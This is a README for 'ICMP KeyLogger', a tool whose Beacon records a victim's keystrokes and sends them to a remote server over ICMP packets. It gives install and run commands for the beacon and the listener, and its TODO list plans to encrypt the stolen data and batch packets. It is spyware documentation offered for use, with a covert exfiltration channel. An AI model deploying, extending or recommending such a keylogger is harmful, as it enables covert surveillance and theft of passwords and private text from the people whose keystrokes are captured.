
# ICMP KeyLogger

## Introduction
ICMP KeyLogger is a tool designed to capture and transmit keystrokes over the network using ICMP packets. It is divided into two main components: the Beacon, which captures keystrokes and sends them, and the Server, which receives and logs these keystrokes.

### TODO
- Implement encryption for keystroke data.
- Group packets to optimize network traffic instead of sending keystrokes instantly.

## Requirements
### Windows
- [npcap](https://nmap.org/npcap/)
- pynput
- scapy

### Linux
- pynput
- scapy

## Installation
Install Python dependencies using pip:
```bash
pip install pynput scapy
```

## Usage
### Identifying Network Interface on Windows
To find the full name of the network interface:
```cmd
ipconfig /all
```
Use the Description field of the relevant interface.

### Running the Beacon
Run the Beacon component using the following command. Replace `[Description from ipconfig /all]` with the actual description of your network interface and `[keylogger server IP]` with the IP address of the server.
```cmd
py ICMPbeacon.py -i "[Description from ipconfig /all]" -d [keylogger server IP]
```

### Running the Server
Run the Server component with the following command. Replace `[listening interface]` with the network interface the server should listen on and `[beacon IP]` with the IP address of the beacon.
```bash
sudo python3 ICMPlogServ.py -i [listening interface] -d [beacon IP]
```
